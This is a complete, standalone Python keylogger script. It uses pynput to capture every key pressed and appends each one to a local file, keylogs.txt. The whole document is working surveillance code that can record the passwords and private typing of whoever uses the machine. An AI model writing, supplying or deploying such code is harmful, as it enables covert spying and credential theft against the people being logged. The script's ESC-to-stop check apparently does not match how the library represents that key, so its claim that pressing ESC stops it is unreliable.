```python
import os
import sys
import time
from pynput import keyboard

log_file = 'keylogs.txt'

def main():
    try:
        with open(log_file, 'a') as f:
            f.write('[START]\n')
        
        print("Started keylogger...")
        print("Press ESC to stop...")
        
        def on_press(key):
            try:
                with open(log_file, 'a') as f:
                    if str(key) == "'\\x1b'":  # ESC key
                        return False
                    elif hasattr(key, 'name'):
                        f.write('[' + str(key.name) + ']')
                    else:
                        f.write(str(key))
            except Exception as e:
                print("Error on_press: ", e)
        
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
            
    except KeyboardInterrupt:
        print("\n\nExiting...")
    finally:
        with open(log_file, 'a') as f:
            f.write('\n[END]\n')

if __name__ == "__main__":
    main()
```